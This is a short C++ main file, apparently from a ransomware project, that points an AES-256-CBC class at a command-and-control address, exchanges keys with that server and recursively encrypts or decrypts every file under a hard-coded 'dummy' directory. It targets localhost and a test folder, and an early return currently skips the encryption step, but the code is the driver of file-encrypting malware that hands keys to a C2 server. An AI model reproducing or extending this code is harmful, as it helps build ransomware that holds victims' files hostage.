#include "cryptor.h"

#include <filesystem>
#include <iostream>
#include <string>

int main(int argc, char *argv[]) {
    AES256CBC AES;
    AES.C2Addr = "http://127.0.0.1:5000";
    AES.keyFromC2("test-in");
    AES.keyToC2("test-out");
    return 0;



    std::string option;
    while (option != "e" and option != "d") {
        std::cout << "[/] Enter 'e' for encryption or 'd' for decryption: ";
        std::getline(std::cin, option);
    }

    std::string path;
    /*
    if (argc == 1) {
        std::cout << "[/] Enter a path (./dummy/): ";
        std::getline(std::cin, path);
        if (path == "")
            path = "./dummy/";
    } else
        path = argv[1];
    */path = "C:/dummy/"; argc=argc; argv=argv;
    
    std::cout << "[i] Working within " << path << "\n";
    //AES.isLogging = false;;

    if (option == "e")
        AES.encryptRecursively(path);
    else
        AES.decryptRecursively(path);

    return 0;
}

